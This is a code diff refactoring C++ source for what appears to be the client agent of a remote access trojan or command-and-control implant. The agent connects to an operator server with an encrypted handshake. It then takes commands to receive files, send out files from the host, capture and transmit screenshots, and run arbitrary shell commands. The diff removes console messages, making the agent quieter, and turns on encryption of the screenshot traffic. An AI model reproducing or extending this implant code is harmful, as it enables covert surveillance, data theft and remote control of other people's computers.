@@ -1,32 +1,30 @@
 #include "Agent.h"
 
-bool Agent::Connect(PCSTR ip, PCSTR port)
+M_Result Agent::Connect(PCSTR ip, PCSTR port)
 {
 	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (not connSocket.Create())
+	if (connSocket.Create() != M_Success)
 	{
-		std::cerr << "Error at Create." << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
-	std::cout << "[+] Client socket successfully created." << std::endl;
-
-	if (not connSocket.Connect(ip, port))
+	if (connSocket.Connect(ip, port) != M_Success)
 	{
-		std::cerr << "Error at Connect" << std::endl;
 		connSocket.Close();
-		return false;
+		return M_GenericWarning;
 	}
-
-	std::cout << "[+] Client successfully connected." << std::endl;
 
 	serverConn = Connection(connSocket.GetSocketHandle(), ip, port);
-	OnConnect(serverConn);
+	
+	if (OnConnect(serverConn) != M_Success)
+	{
+		return M_GenericError;
+	}
 
-	return true;
+	return M_Success;
 }
 
-bool Agent::OnConnect(Connection connection)
+M_Result Agent::OnConnect(Connection& connection)
 {
 	Packet packet;
 
@@ -46,24 +44,22 @@ bool Agent::OnConnect(Connection connection)
 	{
 		std::string err = std::move(*(*out));
 		std::cerr << err << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	clientHello = std::get<std::vector<BYTE>>(optClientHello);
 
 	// send the clientHello
 	packet << clientHello;
-	if (not connection.SendPacket(packet))
+	if (connection.SendPacket(packet) != M_Success)
 	{
-		std::cerr << "Failed to send clientHello packet. Error status: " << GetLastError() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	// receive serverHello
-	if (not connection.RecvPacket(packet))
+	if (connection.RecvPacket(packet) != M_Success)
 	{
-		std::cerr << "Failed to receive serverHello packet. Error status: " << GetLastError() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	try
@@ -74,7 +70,7 @@ bool Agent::OnConnect(Connection connection)
 	catch (const PacketException& e)
 	{
 		std::cout << e.what() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 	
 	seed.assign(clientHello.begin(), clientHello.end());
@@ -104,7 +100,7 @@ bool Agent::OnConnect(Connection connection)
 	{
 		std::string err = *(*out);
 		std::cout << err << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	// send client pubBlob to server
@@ -112,17 +108,15 @@ bool Agent::OnConnect(Connection connection)
 	packet.Clear();
 	packet << pubBlob;
 
-	if (not connection.SendPacket(packet))
+	if (connection.SendPacket(packet) != M_Success)
 	{
-		std::cerr << "Failed to send pubBlob packet. Error status: " << GetLastError() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	// receive the server pubBlob
-	if (not connection.RecvPacket(packet))
+	if (connection.RecvPacket(packet) != M_Success)
 	{
-		std::cerr << "Failed to receive server pubBlob packet. Error status: " << GetLastError() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	try
@@ -133,7 +127,7 @@ bool Agent::OnConnect(Connection connection)
 	catch (const PacketException& e)
 	{
 		std::cout << e.what() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	// Generate secret agreement
@@ -142,7 +136,7 @@ bool Agent::OnConnect(Connection connection)
 	{
 		std::string err = *(*out);
 		std::cout << err << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	packet.Clear();
@@ -164,39 +158,32 @@ bool Agent::OnConnect(Connection connection)
 	catch (const CrypterException& e)
 	{
 		std::cout << e.what() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
-	if (not connection.SendPacket(packet))
+	if (connection.SendPacket(packet) != M_Success)
 	{
-		std::cerr << "Failed to send packet. Error Status: " << GetLastError() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
-	return true;
+	return M_Success;
 }
 
-
-bool Agent::ShutDown()
+void Agent::ShutDown()
 {
-	if (not connSocket.Close())
-	{
-		std::cerr << "Error at Close." << std::endl;
-		return false;
-	}
-	
-	return true;
+	connSocket.Close();
 }
 
-bool Agent::Logic()
+M_Result Agent::Logic()
 {
 	Packet packet;
 	CommandType type;
+	M_Result result {};
 
-	if (not serverConn.RecvPacket(packet))
+	result = serverConn.RecvPacket(packet);
+	if (result != M_Success)
 	{
-		std::cerr << "Error at RecvPacket." << std::endl;
-		return false;
+		return result;
 	}
 
 	try
@@ -206,7 +193,7 @@ bool Agent::Logic()
 
 		if (type == CommandType::agentdown)
 		{
-			return false;
+			return M_GenericError;
 		}
 
 		else if (type == CommandType::upload)
@@ -223,16 +210,16 @@ bool Agent::Logic()
 				packet.Clear(PacketType::response);
 				serverConn.Crypt.EncryptPacket(packet);
 
-				if (not serverConn.SendPacket(packet))
+				result = serverConn.SendPacket(packet);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at SendPacket (path existence)" << std::endl;
-					return false;
+					return result;
 				}
 
-				if (not serverConn.RecvFile(path, bytesToRead))
+				result = serverConn.RecvFile(path, bytesToRead);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at RecvFile." << std::endl;
-					return false;
+					return result;
 				}
 			}
 
@@ -242,10 +229,10 @@ bool Agent::Logic()
 				packet.Clear(PacketType::Invalid);
 				serverConn.Crypt.EncryptPacket(packet);
 
-				if (not serverConn.SendPacket(packet))
+				result = serverConn.SendPacket(packet);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at SendPacket (path existence)" << std::endl;
-					return false;
+					return result;
 				}
 			}	
 		}
@@ -264,16 +251,16 @@ bool Agent::Logic()
 
 				serverConn.Crypt.EncryptPacket(packet);
 
-				if (not serverConn.SendPacket(packet))
+				result = serverConn.SendPacket(packet);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at SendPacket (download)." << std::endl;
-					return false;
+					return result;
 				}
 
-				if (not serverConn.SendFile(path, filesize))
+				result = serverConn.SendFile(path, filesize);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at SendFile." << std::endl;
-					return false;
+					return result;
 				}
 			}
 
@@ -282,10 +269,10 @@ bool Agent::Logic()
 				packet.Clear(PacketType::Invalid);
 				serverConn.Crypt.EncryptPacket(packet);
 
-				if (not serverConn.SendPacket(packet))
+				result = serverConn.SendPacket(packet);
+				if (result != M_Success)
 				{
-					std::cerr << "Error at SendPacket (download)." << std::endl;
-					return false;
+					return result;
 				}
 			}
 		}
@@ -297,12 +284,12 @@ bool Agent::Logic()
 			command.TakeScreenshot(imageBytes);
 			packet << imageBytes;
 
-			//serverConn.Crypt.EncryptPacket(packet);
+			serverConn.Crypt.EncryptPacket(packet);
 
-			if (not serverConn.SendPacket(packet))
+			result = serverConn.SendPacket(packet);
+			if (result != M_Success)
 			{
-				std::cerr << "Error at Send (image bytes)." << std::endl;
-				return false;
+				return result;
 			}
 		}
 
@@ -322,7 +309,7 @@ bool Agent::Logic()
 				else
 				{
 					packet.Clear(PacketType::Invalid);
-					packet << "The system cannot find the path specified.\n";
+					packet << ">> [!] The system cannot find the path specified.\n";
 				}
 			}
 
@@ -333,8 +320,7 @@ bool Agent::Logic()
 
 				if (not command.Execute(cmd))
 				{
-					std::cerr << "Error at Execute" << std::endl;
-					return false;
+					return M_GenericWarning;
 				}
 
 				packet.Clear(PacketType::response);
@@ -342,11 +328,10 @@ bool Agent::Logic()
 			}
 
 			serverConn.Crypt.EncryptPacket(packet);
-
-			if (not serverConn.SendPacket(packet))
+			result = serverConn.SendPacket(packet);
+			if (result != M_Success)
 			{
-				std::cerr << "Error at SendPacket (commandline)." << std::endl;
-				return false;
+				return result;
 			}
 		}
 	}
@@ -354,14 +339,14 @@ bool Agent::Logic()
 	catch (const CrypterException& e)
 	{
 		std::cout << e.what() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
 	catch (const PacketException& e)
 	{
 		std::cout << e.what() << std::endl;
-		return false;
+		return M_GenericError;
 	}
 
-	return true;
+	return M_Success;
 }
